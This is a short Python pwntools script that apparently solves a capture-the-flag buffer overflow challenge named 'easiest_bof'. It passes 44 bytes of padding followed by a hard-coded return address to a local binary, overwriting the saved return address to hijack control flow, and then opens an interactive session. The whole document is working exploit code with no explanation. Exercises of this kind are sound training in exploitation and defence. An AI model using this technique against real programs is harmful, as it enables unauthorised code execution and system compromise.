from pwn import *

arg1 = ""
for i in range(44) :
   arg1 += "A"

arg1 += "\x4d\x84\x04\x08"

p = process(["/home/easiest_bof/easiest_bof", arg1])

p.interactive()
